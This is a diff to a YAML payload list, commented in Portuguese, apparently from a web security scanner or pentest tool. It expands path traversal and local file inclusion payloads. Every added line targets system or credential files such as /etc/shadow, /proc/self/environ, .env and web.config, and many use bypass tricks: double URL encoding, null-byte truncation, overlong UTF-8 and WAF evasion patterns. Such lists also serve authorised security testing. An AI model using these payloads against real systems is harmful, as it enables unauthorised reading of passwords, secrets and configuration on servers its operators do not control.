@@ -1,8 +1,39 @@
+# ── Traversal / Local File Inclusion ──
+# Payloads para Path Traversal e LFI.
+# Inclui bypass de filtros, encoding duplo, null-byte e caminhos Windows.
+
 payloads:
-  - "../../../../../../../../etc/passwd"
-  - "../../../../../../../../etc/shadow"
-  - "../../../../../../../../etc/hostname"
-  - "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd"
-  - "..\\..\\..\\..\\..\\..\\..\\..\\etc\\passwd"
+  # Básico Unix
+  - "../../../../etc/passwd"
+  - "../../../../../etc/passwd"
+  - "../../../../../../etc/passwd"
+  - "../../../../etc/hosts"
+  - "../../../../etc/shadow"
+  - "../../../../proc/self/environ"
+  - "../../../../proc/version"
+  - "../../../../proc/self/cmdline"
+  - "../../../../var/log/apache2/access.log"
+  # Null-byte truncation (PHP < 5.3)
+  - "../../../../etc/passwd%00"
+  - "../../../../etc/passwd%00.php"
+  # Double URL encoding
+  - "..%252f..%252f..%252f..%252fetc/passwd"
+  - "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+  # UTF-8 overlong encoding
+  - "..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd"
+  # WAF bypass patterns
+  - "....//....//....//....//etc/passwd"
+  - "..;/..;/..;/..;/etc/passwd"
+  - "..\\/..\\/..\\/..\\/..\\/etc/passwd"
+  - "..%5c..%5c..%5c..%5cetc/passwd"
+  # Windows
+  - "..\\..\\..\\..\\windows\\win.ini"
+  - "..\\..\\..\\..\\boot.ini"
+  - "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
+  # Direto (sem traversal)
+  - "/etc/passwd"
+  - "/etc/hosts"
   - ".env"
   - "config.json"
+  - "web.config"
+  - "WEB-INF/web.xml"
